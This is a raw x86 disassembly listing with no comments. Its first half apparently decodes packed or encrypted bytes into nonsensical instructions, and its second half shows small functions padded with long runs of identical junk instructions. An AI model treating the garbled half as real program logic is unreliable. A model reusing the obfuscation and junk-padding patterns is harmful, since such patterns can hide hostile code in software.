  44fdeb:	mov    dl,0x3e
  44fded:	call   0x2cf9ee
  44fdf2:	adc    ebp,edi
  44fdf4:	push   ss
  44fdf5:	mov    ebp,edx
  44fdf7:	not    BYTE PTR [ebx+0x7463884d]
  44fdfd:	add    BYTE PTR [ebx],bl
  44fdff:	mov    al,ds:0xb2ccb122
  44fe04:	cmp    al,0xff
  44fe06:	in     eax,0xf6
  44fe08:	xchg   ebx,eax
  44fe09:	in     eax,0xd5
  44fe0b:	icebp  
  44fe0c:	fcmove st,st(4)
  44fe0e:	lds    ebp,FWORD PTR [ecx]
  44fe10:	sti    
  44fe11:	xor    DWORD PTR [edi+ecx*8],0xffffffcf
  44fe15:	inc    ebp
  44fe16:	sbb    BYTE PTR [ebx-0x126ffff2],dh
  44fe1c:	push   ecx
  44fe1d:	fmul   QWORD PTR [eax+0xeb2]
  44fe23:	add    BYTE PTR [eax],al
  44fe25:	add    BYTE PTR [eax],al
  44fe27:	iret   
  44fe28:	outs   dx,DWORD PTR ds:[esi]
  44fe29:	loop   0x44fe2c
  44fe2b:	nop
  44fe2c:	mov    dl,0xe
  44fe2e:	(bad)  
  44fe2f:	dec    ebp
  44fe30:	test   BYTE PTR [esi],0x0
  44fe33:	nop
  44fe34:	mov    dl,0xcf
  44fe36:	inc    ebp
  44fe37:	in     al,dx
  44fe38:	mov    dl,0xe
  44fe3a:	add    BYTE PTR [eax+0x9085a29],dl
  44fe40:	test   al,0x1a
  44fe42:	mov    cl,0x54
  44fe44:	mov    dl,0xf6
  44fe46:	imul   ecx,eax,0x8ca1e7f5
  44fe4c:	inc    ebx
  44fe4d:	push   ebx
  44fe4e:	add    BYTE PTR [ebp-0xb],ch
  44fe51:	out    0x0,eax
  44fe53:	nop
  44fe54:	jle    0x44fe70
  44fe56:	(bad)  
  44fe57:	lea    ebx,[esi-0x4d6fbb63]
  44fe5d:	push   cs
  44fe5e:	add    BYTE PTR [eax-0x6a38eaf7],dl
  44fe64:	sahf   
  44fe65:	popf   
  44fe66:	inc    esp
  44fe67:	nop
  44fe68:	mov    bl,0xe
  44fe6a:	add    BYTE PTR [eax+0x410c2a31],dl
  44fe70:	outs   dx,BYTE PTR ds:[esi]
  44fe71:	push   cs
  44fe72:	add    ch,ah
  44fe74:	test   al,0xcf
  44fe76:	add    eax,0x53437c
  44fe7b:	nop
  44fe7c:	mov    dl,0xe
  44fe7e:	add    BYTE PTR [ebx],dl
  44fe80:	mov    bh,0x2
  44fe82:	mov    cl,0xd4
  44fe84:	mov    dl,0xe
  44fe86:	jne    0x44fe1d
  44fe88:	mov    BYTE PTR [esi],cl
  44fe8a:	inc    DWORD PTR [eax]
  44fe8c:	add    BYTE PTR [eax],al
  44fe8e:	add    BYTE PTR [eax],al
  44fe90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fe91:	adc    bl,BYTE PTR [edi+0x1b519044]
  44fe97:	mov    cl,0xd4
  44fe99:	mov    dl,0x93
  44fe9b:	or     eax,0x534394
  44fea0:	or     DWORD PTR [edi-0xa],esp
  44fea3:	mov    edi,DWORD PTR [ebp-0x5a]
  44fea6:	popf   
  44fea7:	inc    esp
  44fea8:	nop
  44fea9:	sub    DWORD PTR [edx-0x18],edx
  44feac:	xchg   ebx,eax
  44fead:	jo     0x44fed9
  44feaf:	mov    DWORD PTR [ebp+0xa],edx
  44feb2:	xchg   esp,eax
  44feb3:	dec    ebp
  44feb4:	call   0x214118e3
  44feb9:	outs   dx,BYTE PTR ds:[esi]
  44feba:	push   cs
  44febb:	push   0x4eae50
  44fec0:	fistp  WORD PTR [esi-0x4db34f12]
  44fec6:	stos   DWORD PTR es:[edi],eax
  44fec7:	sbb    BYTE PTR [ecx],al
  44fec9:	outs   dx,BYTE PTR ds:[esi]
  44feca:	push   cs
  44fecb:	(bad)  
  44fecc:	(bad)  
  44fecd:	retf   0x449d
  44fed0:	nop
  44fed1:	(bad)  
  44fed2:	adc    al,BYTE PTR [eax-0x70]
  44fed5:	mov    bh,BYTE PTR [esi]
  44fed7:	add    al,0x50
  44fed9:	mov    dl,0x93
  44fedb:	adc    eax,0x534388
  44fee0:	inc    edx
  44fee1:	or     cl,BYTE PTR [ebp-0x740b6808]
  44fee7:	les    ebx,FWORD PTR [eax-0x334eccb1]
  44feed:	mov    dl,0xe7
  44feef:	adc    eax,0x5341b4
  44fef4:	add    BYTE PTR [eax],al
  44fef6:	add    BYTE PTR [eax],al
  44fef8:	add    BYTE PTR [ebx],dh
  44fefa:	mov    edi,0x5190449d
  44feff:	aaa    
  44ff00:	mov    cl,0xcc
  44ff02:	mov    dl,0x3e
  44ff04:	call   0x2cf42d
  44ff09:	adc    ebp,edi
  44ff0b:	adc    cl,BYTE PTR [ecx+0x4d9402d5]
  44ff11:	inc    eax
  44ff12:	(bad)  
  44ff13:	not    ch
  44ff15:	ds hlt 
  44ff17:	out    0x83,eax
  44ff19:	dec    esp
  44ff1a:	scas   eax,DWORD PTR es:[edi]
  44ff1b:	stos   DWORD PTR es:[edi],eax
  44ff1c:	adc    cl,ah
  44ff1e:	outs   dx,BYTE PTR ds:[esi]
  44ff1f:	push   cs
  44ff20:	mov    edi,DWORD PTR [ebp-0x6f95c2fe]
  44ff26:	push   ecx
  44ff27:	push   DWORD PTR [eax-0x17c14d34]
  44ff2d:	ins    BYTE PTR es:[edi],dx
  44ff2e:	cli    
  44ff2f:	out    0xff,eax
  44ff31:	adc    ebp,edi
  44ff33:	sbb    cl,BYTE PTR [ebx+0x4d96024d]
  44ff39:	lock daa 
  44ff3b:	inc    edx
  44ff3c:	cld    
  44ff3d:	stos   DWORD PTR es:[edi],eax
  44ff3e:	pop    ebp
  44ff3f:	fidiv  WORD PTR [ebx+0x4a]
  44ff42:	daa    
  44ff43:	push   edx
  44ff44:	loopne 0x44ff86
  44ff46:	daa    
  44ff47:	pop    edx
  44ff48:	fadd   QWORD PTR [ecx+0xa]
  44ff4b:	mov    ecx,0x8bf3cffb
  44ff50:	les    ebx,FWORD PTR [eax+0x54b10b4f]
  44ff56:	mov    dl,0x93
  44ff58:	adc    eax,0x534194
  44ff5d:	add    BYTE PTR [eax],al
  44ff5f:	add    BYTE PTR [eax],al
  44ff61:	add    BYTE PTR [edx+0x51],al
  44ff64:	aaa    
  44ff65:	mov    cl,0x4c
  44ff67:	mov    dl,0xb
  44ff69:	inc    ebp
  44ff6a:	mov    ah,0x62
  44ff6c:	xchg   ebx,eax
  44ff6d:	or     eax,0x534180
  44ff72:	xchg   ebx,eax
  44ff73:	gs jmp 0x7fff:0xe51b7851
  44ff7b:	das    
  44ff7c:	ror    DWORD PTR [ebx+ecx*1],cl
  44ff7f:	pop    ebp
  44ff80:	loop   0x44ff85
  44ff82:	(bad)
  44ff85:	push   ebp
  44ff86:	ins    BYTE PTR es:[edi],dx
  44ff87:	sub    DWORD PTR [edx-0x1c],eax
  44ff8a:	or     ebp,DWORD PTR [ebp-0x16]
  44ff8d:	add    ecx,ebp
  44ff8f:	(bad)  
  44ff90:	xchg   ebp,eax
  44ff91:	inc    ebp
  44ff92:	dec    esp
  44ff93:	daa    
  44ff94:	pop    edx
  44ff95:	loopne 0x450012
  44ff97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ff98:	or     dh,BYTE PTR [ecx+0x4d95b2d4]
  44ff9e:	xor    BYTE PTR [edi],al
  44ffa0:	mov    edi,eax
  44ffa2:	aad    0xfa
  44ffa4:	push   cs
  44ffa5:	add    BYTE PTR [eax+0xb09f3b2],dl
  44ffab:	pop    ebp
  44ffac:	out    0x83,al
  44ffae:	push   edx
  44ffaf:	scas   al,BYTE PTR es:[edi]
  44ffb0:	xchg   ebp,eax
  44ffb1:	push   ebp
  44ffb2:	or     BYTE PTR [edi],ah
  44ffb4:	push   edx
  44ffb5:	clc    
  44ffb6:	retf   
  44ffb7:	ins    DWORD PTR es:[edi],dx
  44ffb8:	fidiv  WORD PTR [ebx-0x48]
  44ffbb:	daa    
  44ffbc:	sbb    dl,BYTE PTR [eax]
  44ffbe:	inc    ecx
  44ffbf:	outs   dx,BYTE PTR ds:[esi]
  44ffc0:	push   cs
  44ffc1:	add    ebx,DWORD PTR [ebp-0x6]
  44ffc4:	xchg   ebx,eax
  44ffc5:	adc    DWORD PTR [eax],eax
  44ffc7:	add    BYTE PTR [eax],al
  44ffc9:	add    BYTE PTR [eax],al
  44ffcb:	xchg   ebx,eax
  44ffcc:	pop    ebp
  44ffcd:	out    0xa1,al
  44ffcf:	add    BYTE PTR [ecx+0x53],0x0
  44ffd3:	xchg   ebx,eax
  44ffd4:	ins    DWORD PTR es:[edi],dx
  44ffd5:	out    0x89,al
  44ffd7:	mov    al,ds:0x11f85a27
  44ffdc:	icebp  
  44ffdd:	cmc    
  44ffde:	add    edx,DWORD PTR [eax-0x5fea6c4e]
  44ffe4:	inc    ecx
  44ffe5:	push   ebx
  44ffe6:	add    BYTE PTR [ebx-0x65cc19a3],dl
  44ffec:	push   ecx
  44ffed:	push   DWORD PTR [eax+0x450bb254]
  44fff3:	cwde   
  44fff4:	sub    BYTE PTR [edi],dl
  44fff6:	jmp    0x45003f
  44fff8:	cmp    al,0x3a
  44fffa:	add    al,0x41
  44fffc:	ja     0x45000c
  44fffe:	mov    DWORD PTR [ebp-0x6fbb624e],edi
  450004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450005:	aad    0x89
  450007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450008:	jmp    0x89d5:0xa590449e
  45000f:	jge    0x44ffcb
  450011:	popf   
  450012:	inc    esp
  450013:	nop
  450014:	ficomp DWORD PTR [eax]
  450016:	clc    
  450017:	dec    edi
  450018:	repnz xchg ebx,eax
  45001a:	or     eax,0x5323a0
  45001f:	loope  0x44fffb
  450021:	or     al,0xfb
  450023:	aaa    
  450024:	repnz xchg ecx,eax
  450026:	shl    BYTE PTR [ebp+0x3bc01bb6],0x9d
  45002d:	xchg   ebx,eax
  45002e:	and    eax,0x0
  450033:	add    BYTE PTR [ebx+eiz*1-0x8ecffad],dl
  45003a:	adc    al,BYTE PTR [ebx+0x449dc6cd]
  450040:	nop
  450041:	mov    dl,0x62
  450043:	or     DWORD PTR [ecx],esi
  450045:	out    0x9e,eax
  450047:	inc    esp
  450048:	nop
  450049:	cmp    edx,DWORD PTR [ebx+0x24]
  45004c:	xchg   esp,eax
  45004d:	ficom  DWORD PTR [ebp+edi*8+0x1593f1e7]
  450054:	mov    al,ds:0x42005323
  450059:	cmc    
  45005a:	sbb    eax,eax
  45005c:	sbb    ebx,eax
  45005e:	dec    ecx
  45005f:	ret    
  450060:	nop
  450061:	mov    dl,0xe
  450063:	add    BYTE PTR [eax-0x6ffff14e],dl
  450069:	mov    dl,0xe
  45006b:	add    BYTE PTR [eax-0x6ffff14e],dl
  450071:	mov    dl,0xe
  450073:	add    BYTE PTR [eax-0x6ffff14e],dl
  450079:	mov    dl,0xe
  45007b:	add    BYTE PTR [eax-0x6ffff14e],dl
  450081:	mov    dl,0xe
  450083:	add    BYTE PTR [eax-0x6ffff14e],dl
  450089:	mov    dl,0xe
  45008b:	add    BYTE PTR [eax-0x6ffff14e],dl
  450091:	mov    dl,0xe
  450093:	add    BYTE PTR [eax+0xeb2],dl
  450099:	add    BYTE PTR [eax],al
  45009b:	add    BYTE PTR [eax],al
  45009d:	nop
  45009e:	mov    dl,0xe
  4500a0:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500a6:	mov    dl,0xe
  4500a8:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500ae:	mov    dl,0xe
  4500b0:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500b6:	mov    dl,0xe
  4500b8:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500be:	mov    dl,0xe
  4500c0:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500c6:	mov    dl,0xe
  4500c8:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500ce:	mov    dl,0xe
  4500d0:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500d6:	mov    dl,0xe
  4500d8:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500de:	mov    dl,0xe
  4500e0:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500e6:	mov    dl,0xe
  4500e8:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500ee:	mov    dl,0xe
  4500f0:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500f6:	mov    dl,0xe
  4500f8:	add    BYTE PTR [eax-0x6ffff14e],dl
  4500fe:	mov    dl,0xe
  450100:	add    BYTE PTR [eax],al
  450102:	add    BYTE PTR [eax],al
  450104:	add    BYTE PTR [eax],al
  450106:	nop
  450107:	mov    dl,0xe
  450109:	add    BYTE PTR [eax-0x6ffff14e],dl
  45010f:	mov    dl,0xe
  450111:	add    BYTE PTR [eax-0x6ffff14e],dl
  450117:	mov    dl,0xe
  450119:	add    BYTE PTR [eax-0x6ffff14e],dl
  45011f:	mov    dl,0xe
  450121:	add    BYTE PTR [eax-0x6ffff14e],dl
  450127:	mov    dl,0xe
  450129:	add    BYTE PTR [eax-0x6ffff14e],dl
  45012f:	mov    dl,0xe
  450131:	add    BYTE PTR [eax-0x6ffff14e],dl
  450137:	mov    dl,0xe
  450139:	add    BYTE PTR [eax-0x6ffff14e],dl
  45013f:	mov    dl,0xe
  450141:	add    BYTE PTR [eax-0x6ffff14e],dl
  450147:	mov    dl,0xe
  450149:	add    BYTE PTR [eax-0x6ffff14e],dl
  45014f:	mov    dl,0xe
  450151:	add    BYTE PTR [eax-0x6ffff14e],dl
  450157:	mov    dl,0xe
  450159:	add    BYTE PTR [eax-0x6ffff14e],dl
  45015f:	mov    dl,0xe
  450161:	add    BYTE PTR [eax-0x6ffff14e],dl
  450167:	mov    dl,0xe
  450169:	add    BYTE PTR [eax],al
  45016b:	add    BYTE PTR [eax],al
  45016d:	add    BYTE PTR [eax],al
  45016f:	nop
  450170:	mov    dl,0xe
  450172:	add    BYTE PTR [eax-0x6ffff14e],dl
  450178:	mov    dl,0xe
  45017a:	add    BYTE PTR [eax-0x6ffff14e],dl
  450180:	mov    dl,0xe
  450182:	add    BYTE PTR [eax-0x6ffff14e],dl
  450188:	mov    dl,0xe
  45018a:	add    BYTE PTR [eax-0x6ffff14e],dl
  450190:	mov    dl,0xe
  450192:	add    BYTE PTR [eax-0x6ffff14e],dl
  450198:	mov    dl,0xe
  45019a:	add    BYTE PTR [edx],cl
  45019c:	(bad)  
  45019d:	mov    bh,0x8b
  45019f:	imul   eax,DWORD PTR [ebp-0x2d456d4],0x5d
  4501a6:	fnsave [edx+0x7a]
  4501a9:	stc    
  4501aa:	push   cs
  4501ab:	mov    dh,0x87
  4501ad:	(bad)  
  4501ae:	loopne 0x45015b
  4501b0:	adc    cl,ch
  4501b2:	mov    ebx,DWORD PTR [ecx-0x4b]
  4501b5:	mov    ch,0xa4
  4501b7:	test   al,0x3e
  4501b9:	lahf   
  4501ba:	push   ss
  4501bb:	lods   al,BYTE PTR ds:[esi]
  4501bc:	mov    ebp,0xb0c72bd6
  4501c1:	xlat   BYTE PTR ds:[ebx]
  4501c2:	hlt    
  4501c3:	sub    esp,DWORD PTR [ecx-0x1ef0fd64]
  4501c9:	into   
  4501ca:	pop    ecx
  4501cb:	sbb    esp,DWORD PTR [edi]
  4501cd:	ja     0x450169
  4501cf:	lea    ebx,[ecx+ebx*4]
  4501d2:	nop
  4501d3:	mov    eax,ds:0xc9fcb76f
  4501d8:	ja     0x45018b
  4501da:	das    
  4501db:	or     eax,0xf0dfe970
  4501e0:	aad    0x6c
  4501e2:	pushf  
  4501e3:	inc    esp
  4501e4:	into   
  4501e5:	(bad)  
  4501e6:	(bad)  
  4501e7:	mov    ebp,0x611e06a7
  4501ec:	scas   al,BYTE PTR es:[edi]
  4501ed:	cmp    esp,DWORD PTR [ebx+0xd1761c1]
  4501f3:	pop    es
  4501f4:	stos   BYTE PTR es:[edi],al
  4501f5:	or     ch,cl
  4501f7:	addr16 cs adc al,0x9
  4501fb:	adc    eax,0xe47d3b44
  450200:	jno    0x450211
  450202:	mov    edx,0x1081d1b8
  450207:	jne    0x450243
  450209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  45020a:	out    dx,eax
  45020b:	push   ds
  45020c:	and    eax,0xd6d2b69
  450211:	mov    al,ds:0xcc5835ab
  450216:	call   DWORD PTR [eax-0x4d]
  450219:	jne    0x450246
  45021b:	add    bh,BYTE PTR [eax+0x3a96c01b]
  450221:	add    eax,0xf4b5ae78
  450226:	ss or  al,0xfd
  45022a:	fadd   st(7),st
  45022c:	mov    DWORD PTR [esi-0x68e5826e],edi
  450232:	jb     0x450245
  450234:	dec    ebp
  450235:	jecxz  0x4501df
  450237:	hlt    
  450238:	popa   
  450239:	dec    esi
  45023a:	push   edx
  45023b:	mov    BYTE PTR [eax],0x32
  45023e:	adc    esp,DWORD PTR [esp+edi*2-0x319d1547]
  450245:	lods   al,BYTE PTR ds:[esi]
  450246:	xchg   ebp,eax
  450247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450248:	test   BYTE PTR [ebp+ebx*8-0x3f],0xc0
  45024d:	mov    cl,0x4
  45024f:	push   eax
  450250:	test   eax,0xc6ea9cea
  450255:	in     eax,dx
  450256:	out    dx,al
  450257:	(bad)  
  450259:	in     eax,0xf2
  45025b:	pop    eax
  45025c:	mov    esp,0x24043162
  450261:	imul   ebx,DWORD PTR [ecx+0x19],0x3d
  450265:	jge    0x450225
  450267:	jmp    0x4502d8
  450269:	mov    ds:0x509c7c0a,eax
  45026e:	aaa    
  45026f:	lea    eax,[ecx]
  450271:	jge    0x450218
  450273:	xor    eax,0xfc180f3a
  450278:	mov    ds,esi
  45027a:	(bad)
  45027e:	ret    0x1f96
  450281:	ds mov cl,0x9b
  450284:	jecxz  0x45027a
  450286:	xchg   edi,eax
  450287:	cmp    BYTE PTR [edi],0xd
  45028a:	mov    ds:0x2163cc69,eax
  45028f:	sbb    eax,0x99512728
  450294:	sub    BYTE PTR [eax+0x3048ef40],0x87
  45029b:	xchg   ebp,eax
  45029c:	mul    BYTE PTR [ebx-0x3e]
  45029f:	dec    eax
  4502a0:	stos   BYTE PTR es:[edi],al
  4502a1:	add    al,0xc3
  4502a3:	pop    esi
  4502a4:	test   DWORD PTR [esi+0x27ba9cc],edx
  4502aa:	mov    bh,0x36
  4502ac:	div    ecx
  4502ae:	xlat   BYTE PTR ds:[ebx]
  4502af:	fsubr  st(3),st
  4502b1:	jecxz  0x45029a
  4502b3:	mov    es,ebx
  4502b5:	push   ds
  4502b6:	(bad)  
  4502b8:	daa    
  4502b9:	jnp    0x450268
  4502bb:	jl     0x45025b
  4502bd:	(bad)  
  4502be:	jne    0x450254
  4502c0:	js     0x45026b
  4502c2:	fisub  WORD PTR [edi+0x733f35db]
  4502c8:	mov    ch,0xe7
  4502ca:	(bad)  
  4502cb:	jb     0x450263
  4502cd:	es cmc 
  4502cf:	pop    edx
  4502d0:	stos   DWORD PTR es:[edi],eax
  4502d1:	cmp    eax,0x589f369
  4502d6:	vxorps xmm2,xmm1,XMMWORD PTR [ebp+0x1d]
  4502dc:	test   al,0x95
  4502de:	call   0x631d:0x4e2618e4
  4502e5:	das    
  4502e6:	daa    
  4502e7:	push   0xffffffdc
  4502e9:	dec    esi
  4502ea:	nop
  4502eb:	ss dec ebp
  4502ed:	cmp    BYTE PTR [edi],0x9e
  4502f0:	sub    DWORD PTR [edx],eax
  4502f2:	or     eax,eax
  4502f4:	push   ss
  4502f5:	sbb    eax,0x5b57ec47
  4502fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4502fb:	idiv   BYTE PTR [ecx*1-0x339814e0]
  450302:	xor    edx,DWORD PTR [ebx+0x7ddbfcff]
  450308:	icebp  
  450309:	sub    DWORD PTR [ebx+0x42],edi
  45030c:	retf   
  45030d:	and    BYTE PTR [ecx+0x35],cl
  450310:	mov    ebp,0xa5bb2e9
  450315:	jl     0x450314
  450317:	fstp   TBYTE PTR [ebx-0x17]
  45031a:	ss cli 
  45031c:	pop    eax
  45031d:	fbstp  TBYTE PTR [edx+0x3e]
  450320:	fndisi(8087 only) 
  450322:	fisttp DWORD PTR [esi+0x458e99bb]
  450328:	not    BYTE PTR [edx-0x2e]
  45032b:	mov    esp,0x9e37a9d8
  450330:	mov    edx,0xdf395c5
  450335:	sub    BYTE PTR [eax+0x51d8a5f8],ch
  45033b:	cmp    dl,BYTE PTR [edi+edx*2]
  45033e:	(bad)  
  45033f:	popa   
  450340:	in     al,dx
  450341:	jle    0x4502c9
  450343:	inc    ebx
  450344:	popf   
  450345:	nop
  450346:	xor    esi,DWORD PTR [esi+0x1089580c]
  45034c:	xchg   edx,eax
  45034d:	inc    ebx
  45034e:	jmp    0x450322
  450350:	and    eax,0x752725cb
  450355:	pop    es
  450356:	pop    esi
  450357:	sub    BYTE PTR [ecx],dh
  450359:	jmp    0xe2752c9c
  45035e:	dec    esp
  45035f:	add    eax,0x39fbb7f3
  450364:	clc    
  450365:	dec    edi
  450366:	sbb    BYTE PTR [edx+0xe],ch
  450369:	sub    cl,ch
  45036b:	mov    DWORD PTR [ebx+0x2a],esp
  45036e:	mov    ds:0x26e74778,al
  450373:	sub    al,0x45
  450375:	xlat   BYTE PTR ds:[ebx]
  450376:	sbb    esi,edx
  450378:	xor    al,0xc
  45037a:	and    BYTE PTR [ebx],al
  45037c:	dec    ebx
  45037d:	push   0x18a868df
  450382:	mov    ch,BYTE PTR es:[ebx]
  450385:	add    al,0x87
  450387:	or     DWORD PTR [ebp+0x5d],eax
  45038a:	pop    ebx
  45038b:	into   
  45038c:	xor    edx,ebp
  45038e:	out    0xa5,eax
  450390:	pop    esi
  450391:	add    DWORD PTR [edi],esp
  450393:	and    bh,BYTE PTR [ecx]
  450395:	adc    eax,0x7ac5697c
  45039a:	xor    ecx,esp
  45039c:	int3   
  45039d:	int3   
  45039e:	int3   
  45039f:	int3   
  4503a0:	push   ebp
  4503a1:	mov    ebp,esp
  4503a3:	pop    ebp
  4503a4:	ret    0x10
  4503a7:	int3   
  4503a8:	int3   
  4503a9:	int3   
  4503aa:	int3   
  4503ab:	int3   
  4503ac:	int3   
  4503ad:	int3   
  4503ae:	int3   
  4503af:	int3   
  4503b0:	push   ebp
  4503b1:	mov    ebp,esp
  4503b3:	pop    ebp
  4503b4:	ret    0x10
  4503b7:	int3   
  4503b8:	int3   
  4503b9:	int3   
  4503ba:	int3   
  4503bb:	int3   
  4503bc:	int3   
  4503bd:	int3   
  4503be:	int3   
  4503bf:	int3   
  4503c0:	push   ebp
  4503c1:	mov    ebp,esp
  4503c3:	call   0x450a20
  4503c8:	mov    eax,ds:0x45612c
  4503cd:	push   eax
  4503ce:	call   0x451660
  4503d3:	add    esp,0x4
  4503d6:	mov    ds:0x456130,eax
  4503db:	pop    ebp
  4503dc:	ret    
  4503dd:	int3   
  4503de:	int3   
  4503df:	int3   
  4503e0:	push   ebp
  4503e1:	mov    ebp,esp
  4503e3:	push   ecx
  4503e4:	mov    DWORD PTR [ebp-0x4],0x4
  4503eb:	mov    eax,DWORD PTR [ebp-0x4]
  4503ee:	add    eax,0x401270
  4503f3:	mov    ds:0x456134,eax
  4503f8:	mov    esp,ebp
  4503fa:	pop    ebp
  4503fb:	ret    
  4503fc:	int3   
  4503fd:	int3   
  4503fe:	int3   
  4503ff:	int3   
  450400:	push   ebp
  450401:	mov    ebp,esp
  450403:	mov    eax,DWORD PTR [ebp+0x8]
  450406:	mov    ecx,DWORD PTR [ebp+0x8]
  450409:	add    ecx,DWORD PTR [eax+0x4]
  45040c:	mov    eax,ecx
  45040e:	pop    ebp
  45040f:	ret    
  450410:	push   ebp
  450411:	mov    ebp,esp
  450413:	mov    eax,DWORD PTR [ebp+0x8]
  450416:	mov    eax,DWORD PTR [eax-0x4]
  450419:	pop    ebp
  45041a:	ret    
  45041b:	int3   
  45041c:	int3   
  45041d:	int3   
  45041e:	int3   
  45041f:	int3   
  450420:	push   ebp
  450421:	mov    ebp,esp
  450423:	sub    esp,0x18
  450426:	mov    eax,DWORD PTR [ebp+0x8]
  450429:	mov    DWORD PTR [ebp-0x8],eax
  45042c:	mov    ecx,DWORD PTR [ebp+0xc]
  45042f:	mov    DWORD PTR [ebp-0x4],ecx
  450432:	mov    DWORD PTR [ebp-0x10],0x19c
  450439:	mov    edx,DWORD PTR [ebp-0x8]
  45043c:	mov    DWORD PTR ds:0x456138,edx
  450442:	mov    eax,DWORD PTR [ebp-0x4]
  450445:	mov    ds:0x45613c,eax
  45044a:	mov    ecx,DWORD PTR ds:0x456138
  450450:	mov    DWORD PTR [ebp-0x14],ecx
  450453:	mov    edx,DWORD PTR ds:0x45613c
  450459:	mov    DWORD PTR [ebp-0xc],edx
  45045c:	mov    eax,DWORD PTR [ebp-0xc]
  45045f:	mov    ecx,DWORD PTR [ebp-0x14]
  450462:	lea    edx,[ecx+eax*2]
  450465:	mov    DWORD PTR [ebp-0x18],edx
  450468:	mov    eax,DWORD PTR [ebp-0x18]
  45046b:	mov    DWORD PTR [ebp-0x14],eax
  45046e:	mov    ecx,DWORD PTR [ebp-0x14]
  450471:	movzx  edx,WORD PTR [ecx]
  450474:	mov    DWORD PTR [ebp-0xc],edx
  450477:	mov    eax,DWORD PTR [ebp-0xc]
  45047a:	mov    esp,ebp
  45047c:	pop    ebp
  45047d:	ret    
  45047e:	int3   
  45047f:	int3   
  450480:	push   ebp
  450481:	mov    ebp,esp
  450483:	sub    esp,0xc
  450486:	mov    eax,DWORD PTR [ebp+0x8]
  450489:	mov    DWORD PTR [ebp-0x8],eax
  45048c:	mov    ecx,DWORD PTR [ebp+0xc]
  45048f:	mov    DWORD PTR [ebp-0xc],ecx
  450492:	mov    DWORD PTR [ebp-0x4],0x11afc
  450499:	mov    edx,DWORD PTR [ebp-0x8]
  45049c:	cmp    edx,DWORD PTR [ebp-0xc]
  45049f:	jae    0x4504af
  4504a1:	mov    DWORD PTR [ebp-0x4],0x11afc
  4504a8:	mov    eax,DWORD PTR [ebp-0x8]
  4504ab:	jmp    0x4504b9
  4504ad:	jmp    0x4504b9
  4504af:	mov    DWORD PTR [ebp-0x4],0x11afc
  4504b6:	mov    eax,DWORD PTR [ebp-0xc]
  4504b9:	mov    esp,ebp
  4504bb:	pop    ebp
  4504bc:	ret    
  4504bd:	int3   
  4504be:	int3   
  4504bf:	int3   
  4504c0:	push   ebp
  4504c1:	mov    ebp,esp
  4504c3:	push   ecx
  4504c4:	mov    DWORD PTR [ebp-0x4],0x3085
  4504cb:	mov    DWORD PTR [ebp-0x4],0x3085
  4504d2:	mov    DWORD PTR [ebp-0x4],0x3085
  4504d9:	mov    DWORD PTR [ebp-0x4],0x3085
  4504e0:	mov    DWORD PTR [ebp-0x4],0x3085
  4504e7:	mov    DWORD PTR [ebp-0x4],0x3085
  4504ee:	mov    DWORD PTR [ebp-0x4],0x3085
  4504f5:	mov    DWORD PTR [ebp-0x4],0x3085
  4504fc:	mov    DWORD PTR [ebp-0x4],0x3085
  450503:	mov    DWORD PTR [ebp-0x4],0x3085
  45050a:	mov    DWORD PTR [ebp-0x4],0x3085
  450511:	mov    DWORD PTR [ebp-0x4],0x3085
  450518:	mov    DWORD PTR [ebp-0x4],0x3085
  45051f:	mov    DWORD PTR [ebp-0x4],0x3085
  450526:	mov    DWORD PTR [ebp-0x4],0x3085
  45052d:	mov    DWORD PTR [ebp-0x4],0x3085
  450534:	mov    DWORD PTR [ebp-0x4],0x3085
  45053b:	mov    DWORD PTR [ebp-0x4],0x3085
  450542:	mov    DWORD PTR [ebp-0x4],0x3085
  450549:	mov    DWORD PTR [ebp-0x4],0x3085
  450550:	mov    DWORD PTR [ebp-0x4],0x3085
  450557:	mov    DWORD PTR [ebp-0x4],0x3085
  45055e:	mov    DWORD PTR [ebp-0x4],0x3085
  450565:	mov    DWORD PTR [ebp-0x4],0x3085
  45056c:	mov    DWORD PTR [ebp-0x4],0x3085
  450573:	mov    DWORD PTR [ebp-0x4],0x3085
  45057a:	mov    DWORD PTR [ebp-0x4],0x3085
  450581:	mov    DWORD PTR [ebp-0x4],0x3085
  450588:	mov    DWORD PTR [ebp-0x4],0x3085
  45058f:	mov    DWORD PTR [ebp-0x4],0x3085
  450596:	mov    DWORD PTR [ebp-0x4],0x3085
  45059d:	mov    DWORD PTR [ebp-0x4],0x3085
  4505a4:	mov    DWORD PTR [ebp-0x4],0x3085
  4505ab:	mov    DWORD PTR [ebp-0x4],0x3085
  4505b2:	mov    DWORD PTR [ebp-0x4],0x3085
  4505b9:	mov    DWORD PTR [ebp-0x4],0x3085
  4505c0:	mov    DWORD PTR [ebp-0x4],0x3085
  4505c7:	mov    DWORD PTR [ebp-0x4],0x3085
  4505ce:	mov    DWORD PTR [ebp-0x4],0x3085
  4505d5:	mov    DWORD PTR [ebp-0x4],0x3085
  4505dc:	mov    DWORD PTR [ebp-0x4],0x3085
  4505e3:	cmp    DWORD PTR [ebp+0x8],0x1
  4505e7:	jne    0x4505f1
  4505e9:	mov    eax,ds:0x456140
  4505ee:	mov    DWORD PTR [ebp+0x8],eax
  4505f1:	mov    ecx,DWORD PTR [ebp+0x10]
  4505f4:	push   ecx
  4505f5:	mov    edx,DWORD PTR [ebp+0xc]
  4505f8:	push   edx
  4505f9:	mov    eax,DWORD PTR [ebp+0x8]
  4505fc:	push   eax
  4505fd:	call   0x4516e0
  450602:	add    esp,0xc
  450605:	mov    ecx,DWORD PTR [ebp+0x8]
  450608:	push   ecx
  450609:	call   0x450400
  45060e:	add    esp,0x4
  450611:	mov    DWORD PTR [ebp+0x8],eax
